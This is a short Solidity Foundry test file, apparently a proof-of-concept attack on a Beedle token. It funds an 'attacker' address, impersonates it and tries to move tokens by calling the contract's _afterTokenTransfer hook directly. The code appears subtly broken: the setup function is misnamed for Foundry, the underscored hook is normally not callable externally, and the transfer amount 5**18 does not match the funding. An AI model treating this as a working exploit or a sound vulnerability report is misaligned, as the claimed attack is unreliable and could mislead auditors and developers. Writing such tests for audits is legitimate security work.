pragma solidity ^0.8.19;

import {Beedle} from "../src/Beedle.sol";
import "forge-std/Test.sol";

contract BeedleAttacker is Test{
    Beedle beedle;
    address attacker = address(1);

    function setup() public {
    // Une instance du contrat Beedle
      beedle = new Beedle() ; 
    // Transfert 10^18 a l'adresse attacker
      beedle.transfer(attacker, 10**18);
    }

    function afterTokenTransferAttack() external {
        // connexion au compte de l'attaquant
        vm.startPrank(attacker);
        // transfert des tokens depuis la fonction _afterTokenTransfer
        beedle._afterTokenTransfer(attacker, address(2), 5**18);
    } 
}
